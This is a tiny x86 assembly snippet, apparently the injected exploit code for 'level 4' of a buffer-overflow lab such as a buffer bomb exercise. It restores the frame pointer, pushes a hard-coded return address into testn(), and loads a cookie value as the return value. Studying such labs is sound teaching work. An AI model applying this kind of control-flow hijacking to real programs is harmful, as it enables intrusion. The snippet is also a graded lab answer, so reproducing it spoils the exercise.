# assembly for level 4
leal	0x28(%esp), %ebp	# restore ebp
pushl	$0x08048e02			# push return address of testn()
movl	$0x32af7935, %eax	# set return value to cookie
ret
